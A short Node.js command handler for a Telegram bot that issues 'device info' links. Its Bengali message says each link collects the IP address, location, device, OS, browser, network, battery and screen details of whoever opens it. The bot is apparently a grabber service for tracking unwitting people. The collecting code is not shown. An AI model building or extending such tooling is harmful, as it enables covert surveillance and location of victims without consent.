const authMiddleware = require('../middlewares/auth');
const rateLimiter = require('../middlewares/rateLimiter');
const generator = require('../utils/generator');

module.exports = async (bot, msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  try {
    const auth = await authMiddleware(msg);
    if (!auth.allowed) return;
    
    const rateLimit = rateLimiter(userId);
    if (!rateLimit.allowed) return;
    
    const link = await generator.generateInfoLink(userId);
    
    auth.user.totalLinks += 1;
    await auth.user.save();
    
    const message = `✅ 𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐍𝐅𝐎 𝐋𝐈𝐍𝐊\n\n` +
      `🔗 আপনার লিঙ্ক:\n${link.url}\n\n` +
      `📱 যা কালেক্ট করবে:\n` +
      `• আইপি ও লোকেশন\n` +
      `• ডিভাইস ও ওএস\n` +
      `• ব্রাউজার ডিটেইলস\n` +
      `• নেটওয়ার্ক ইনফো\n` +
      `• ব্যাটারি স্ট্যাটাস\n` +
      `• স্ক্রিন রেজুলুশন\n\n` +
      `⏰ এক্সপায়ার: ৭ দিন`;
    
    await bot.sendMessage(chatId, message);
    
  } catch (error) {
    console.error('Info Command Error:', error);
  }
};